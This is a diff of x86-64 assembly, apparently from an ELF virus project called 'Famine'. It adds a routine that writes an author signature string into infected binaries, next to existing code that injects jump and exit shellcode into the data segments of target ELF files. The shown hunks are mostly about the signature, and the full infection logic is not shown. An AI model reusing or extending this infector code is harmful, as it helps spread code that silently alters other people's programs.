@@ -442,7 +442,7 @@ push rdx
 	pop rdx
 	pop rcx
 retn
-%define SHELLCODE_LEN 51 ; 34 + 5 (jmp) + 12 (exit)
+%define SHELLCODE_LEN 90 ; 34 + 5 (jmp) + 12 (exit) + signature (39)
 %define SHELLCODE_JMP_INDEX 39 ; 34 + 5 (jmp)
 %define PURE_SHELLCODE_LEN 34 
 ; void parse64elf(void *file, int wfd, unsigned long fsize)
@@ -1221,6 +1221,7 @@ parse64elfsec:
 	mov rsi, QWORD[rsp + 16]
 	call write_jmp_shellcode
 	call write_exit_shellcode; so it doesn't segv when ret is reached in original code
+	call write_signature
 	mov rsi, QWORD[rsp + 16]
 	add rsi, QWORD[rsp + 8];point to offset end of data seg in file
 	mov rdx, r9 ; fsize
@@ -1319,4 +1320,23 @@ write_exit_shellcode:
 	syscall; write(wfd, 0x0f05, 2);
 	pop rax
 	;all this is eq to c: exit(0);
+retn
+
+write_signature:
+	mov rax, 0x0000636c656d2d6c
+	push rax
+	mov rax, 0x6573207962206465
+	push rax
+	mov rax, 0x646f29632820302e
+	push rax
+	mov rax, 0x31206e6f69737265
+	push rax
+	mov rax, 0x7620656e696d6146
+	push rax
+	mov rsi, rsp
+	mov rax, 1
+	mov rdx, 39
+	syscall; write(wfd, "Famine version 1.0 (c)oded by sel-melc\0", 39)
+
+	add rsp, 40
 retn
